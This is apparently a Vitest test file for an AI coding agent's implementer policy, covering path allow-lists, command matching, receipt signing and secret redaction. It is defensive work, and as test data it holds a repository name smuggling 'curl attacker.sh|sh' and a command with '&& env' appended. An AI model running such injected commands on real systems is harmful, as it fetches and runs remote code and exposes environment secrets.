/** @vitest-environment node */
import { resolveImplementerFixtureMode } from "@agent/subagents/implementer/lib/fixture-mode";
import { createImplementationFixtureHandoff } from "@agent/implementation-fixture";
import {
  assertAllowedProductionFiles,
  assertProductionWriteNotClaimed,
  assertExactFocusedCommand,
  assertWellFormedRepositoryFullName,
  classifyGreenRun,
  createImplementationExecutionReceipt,
  parseWorkingTreePaths,
  redactImplementationOutput,
  sandboxWorkingTreeStatusCommand,
  verifyImplementationExecutionReceipt,
} from "@agent/subagents/implementer/lib/tool-policy";

describe("implementer fixture mode", () => {
  it("is explicit, local-only, and fail-closed in production", () => {
    expect(resolveImplementerFixtureMode({})).toEqual({ enabled: false, reason: "not_requested" });
    expect(
      resolveImplementerFixtureMode({
        LOOPWORKS_EVE_IMPLEMENTER_FIXTURE_MODE: "true",
        NODE_ENV: "development",
      }),
    ).toEqual({ enabled: true, reason: "explicit_non_production_fixture" });
    expect(
      resolveImplementerFixtureMode({
        LOOPWORKS_EVE_IMPLEMENTER_FIXTURE_MODE: "true",
        VERCEL_ENV: "production",
      }),
    ).toEqual({ enabled: false, reason: "production_runtime_blocked" });
  });
});

describe("implementer write and execution policy", () => {
  it("allows production files while rejecting test, generated, and traversal paths", () => {
    expect(() => assertAllowedProductionFiles([{ path: "src/lib/runtime.ts" }])).not.toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "tests/unit/runtime.test.ts" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "../src/runtime.ts" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "node_modules/pkg/index.js" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "package.json" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "bun.lock" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: ".github/workflows/ci.yml" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: ".env.local" }])).toThrow();
  });

  it("allows production files named after fixtures while rejecting test directories", () => {
    expect(() =>
      assertAllowedProductionFiles([{ path: "agent/subagents/implementer/lib/fixture-mode.ts" }]),
    ).not.toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "tests/fixtures/data.ts" }])).toThrow();
    expect(() => assertAllowedProductionFiles([{ path: "src/lib/runtime.test.ts" }])).toThrow();
  });

  it("rejects repository names that could smuggle shell syntax into the checkout", () => {
    expect(() => assertWellFormedRepositoryFullName("ncolesummers/loopworks")).not.toThrow();
    expect(() => assertWellFormedRepositoryFullName("x/$(curl attacker.sh|sh)")).toThrow();
    expect(() => assertWellFormedRepositoryFullName("owner/repo/extra")).toThrow();
    expect(() => assertWellFormedRepositoryFullName("owner")).toThrow();
  });

  it("sees untracked files when verifying the sandbox working tree", () => {
    expect(sandboxWorkingTreeStatusCommand).toContain("git status --porcelain");
    // Without --untracked-files=all, new directories collapse to "?? dir/" and
    // hide the files inside them from path verification.
    expect(sandboxWorkingTreeStatusCommand).toContain("--untracked-files=all");
    expect(
      parseWorkingTreePaths("?? tests/unit/red.test.ts\n M src/app.ts\n D src/old.ts\n"),
    ).toEqual(["src/app.ts", "src/old.ts", "tests/unit/red.test.ts"]);
    expect(parseWorkingTreePaths(' M "tests/unit/sp ace.test.ts"\n')).toEqual([
      "tests/unit/sp ace.test.ts",
    ]);
    expect(parseWorkingTreePaths("")).toEqual([]);
  });

  it("classifies green runs by exit code and pass evidence, not incidental words", () => {
    expect(
      classifyGreenRun({
        exitCode: 0,
        output: "✓ tests/unit/timeout.test.ts > handles request timeout\nTests  1 passed (1)",
        testPath: "tests/unit/timeout.test.ts",
      }),
    ).toBe("pass");
    expect(
      classifyGreenRun({
        exitCode: 0,
        output: "tests/unit/runtime.test.ts",
        testPath: "tests/unit/runtime.test.ts",
      }),
    ).toBe("invalid");
    expect(
      classifyGreenRun({
        exitCode: 1,
        output: "Tests  1 passed (1) tests/unit/runtime.test.ts",
        testPath: "tests/unit/runtime.test.ts",
      }),
    ).toBe("invalid");
  });

  it("permits exactly one production write per implementation session", () => {
    expect(() => assertProductionWriteNotClaimed(null)).not.toThrow();
    expect(() => assertProductionWriteNotClaimed("already-claimed")).toThrow(
      "only once per implementation session",
    );
  });

  it("runs only the exact planned focused command and classifies real green output", () => {
    expect(() =>
      assertExactFocusedCommand(
        "bun run test -- tests/unit/runtime.test.ts",
        "bun run test -- tests/unit/runtime.test.ts",
        "tests/unit/runtime.test.ts",
      ),
    ).not.toThrow();
    expect(() =>
      assertExactFocusedCommand(
        "bun run test -- tests/unit/runtime.test.ts && env",
        "bun run test -- tests/unit/runtime.test.ts",
        "tests/unit/runtime.test.ts",
      ),
    ).toThrow();
    expect(
      classifyGreenRun({
        exitCode: 0,
        output: "PASS tests/unit/runtime.test.ts",
        testPath: "tests/unit/runtime.test.ts",
      }),
    ).toBe("pass");
    expect(
      classifyGreenRun({
        exitCode: 0,
        output: "No test files found",
        testPath: "tests/unit/runtime.test.ts",
      }),
    ).toBe("invalid");
  });

  it("redacts output and signs every artifact digest into the execution receipt", () => {
    const payload = {
      kind: "focused" as const,
      command: "bun run test -- tests/unit/runtime.test.ts",
      exitCode: 0,
      outcome: "pass" as const,
      outputSha256: "a".repeat(64),
      planSha256: "b".repeat(64),
      testPlanSha256: "c".repeat(64),
      testPatchSha256: "d".repeat(64),
      productionPatchSha256: "e".repeat(64),
      testPaths: ["tests/unit/runtime.test.ts"],
    };
    const receipt = createImplementationExecutionReceipt(payload, "secret");
    expect(verifyImplementationExecutionReceipt(payload, receipt, "secret")).toBe(true);
    expect(
      verifyImplementationExecutionReceipt(
        { ...payload, productionPatchSha256: "f".repeat(64) },
        receipt,
        "secret",
      ),
    ).toBe(false);

    const redacted = redactImplementationOutput(
      [
        "authorization: Bearer abc API_TOKEN=secret ghp_abcdefghijklmnopqrstuvwxyz",
        "AKIAABCDEFGHIJKLMNOP",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature",
        "-----BEGIN PRIVATE KEY-----\nprivate-material\n-----END PRIVATE KEY-----",
      ].join("\n"),
    );
    expect(redacted).not.toContain("abc");
    expect(redacted).not.toContain("secret");
    expect(redacted).not.toContain("ghp_");
    expect(redacted).not.toContain("AKIA");
    expect(redacted).not.toContain("eyJhbGci");
    expect(redacted).not.toContain("private-material");
  });

  it("reuses the test-writing fixture records as the implementation handoff", () => {
    const handoff = createImplementationFixtureHandoff();
    expect(handoff.testPlan.fixtures).toEqual([
      {
        id: "approved-plan",
        kind: "fixture",
        description: "Approved-plan fixture authored by the test-writing stage.",
        data: { approved: true },
      },
    ]);
    expect(handoff.testPlan.tests[0]?.fixtureIds).toEqual(["approved-plan"]);
  });
});
